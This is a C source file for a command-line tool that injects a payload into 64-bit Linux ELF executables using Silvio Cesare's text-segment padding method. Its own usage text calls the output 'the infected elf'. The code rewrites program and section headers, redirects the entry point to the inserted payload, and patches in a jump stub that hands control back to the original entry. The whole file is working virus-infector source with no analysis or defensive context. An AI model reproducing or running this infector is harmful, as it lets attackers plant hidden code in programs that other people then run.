#include <stdio.h>
#include <stdlib.h>
#include <sys/stat.h>
#include <elf.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>

#define PAGE_SZ64 0x2000
#define PAGE_SZ32 4096

char* silvio_infect_64(char* elf, int elf_len, char* payload, int payload_len);

int main(int argc, char** argv){
    
    if (argc != 4){
        printf("[*] Usage %s <host> <payload> <virus>\n", argv[0]);
        printf("\thost: the elf to be infected\n");
        printf("\tpayload: the payload that will be added to the host\n");
        printf("\tvirus: the outputed infected elf\n");
        exit(EXIT_FAILURE);
    }

    struct stat s;
    int fd_e = open(argv[1], O_RDONLY);
    int fd_p = open(argv[2], O_RDONLY);
    int fd_v = open(argv[3], O_WRONLY | O_CREAT | O_TRUNC, S_IRUSR | S_IWUSR | S_IXUSR);
    int size_e, size_p, size_v;

    fstat(fd_e, &s);
    size_e = s.st_size;

    fstat(fd_p, &s);
    size_p = s.st_size;

    char* elf = malloc(size_e);
    char* payload = malloc(size_p);
    char* virus;

    read(fd_e, elf, size_e);
    read(fd_p, payload, size_p);

    virus = silvio_infect_64(elf, size_e, payload, size_p);
    write(fd_v, virus, size_e + PAGE_SZ64);
    
    free(elf);
    free(payload);
    free(virus);

    close(fd_e);
    close(fd_p);
    close(fd_v);

    return 0;
}


char* silvio_infect_64(char* elf, int elf_len, char* payload, int payload_len){

    char* virus = malloc(elf_len + PAGE_SZ64);
    char jmp_entry[] = "\x48\xb8\x41\x41\x41\x41\x41\x41\x41\x41" //mov rax,0x4141414141414141
                        "\xff\xe0"; // jmp rax
    int jmp_len = 12;
    payload_len += jmp_len; // add the len of the jmp_entry

    Elf64_Ehdr* hdr;
    Elf64_Phdr* phdr;
    Elf64_Shdr* shdr;
    Elf64_Addr entry, payload_vaddr, text_end;


    // Get the elf_header
    hdr = (Elf64_Ehdr*) elf;

    // Get some value from the elf_hdr
    entry = hdr->e_entry;
    phdr = (Elf64_Phdr*) (elf + hdr->e_phoff);
    shdr = (Elf64_Shdr*) (elf + hdr->e_shoff);

    // Increase section header offset by PAGE_SIZE
    hdr->e_shoff += PAGE_SZ64;

    for(int i=0; i < hdr->e_phnum; i++){
        if(phdr[i].p_type == PT_LOAD && phdr[i].p_flags == (PF_R | PF_X)){
            //puts("text found");
            text_end = phdr[i].p_offset + phdr[i].p_filesz;

            payload_vaddr = phdr[i].p_vaddr + phdr[i].p_filesz;
            hdr->e_entry = payload_vaddr;
            phdr[i].p_filesz += payload_len;
            phdr[i].p_memsz += payload_len;

            for(int j=i+1; j < hdr->e_phnum; j++)
                phdr[j].p_offset += PAGE_SZ64;

            break;
        }
    }

    for(int i=0; i < hdr->e_shnum; i++){
        if(shdr[i].sh_offset > text_end)
            shdr[i].sh_offset += PAGE_SZ64;
        
        else if(shdr[i].sh_addr + shdr[i].sh_size == payload_vaddr)
            shdr[i].sh_size += payload_len;
    }
    
    // Patch the jmp
    memcpy(&jmp_entry[2], (char*)&entry, 8);

    // Start building the new elf
    memcpy(virus, elf, (size_t) text_end);
    memcpy(virus + text_end, payload, payload_len - jmp_len);
    memcpy(virus + text_end + payload_len - jmp_len, jmp_entry, jmp_len);
    memcpy(virus + text_end + PAGE_SZ64, elf + text_end, elf_len - text_end);

    return virus;

}



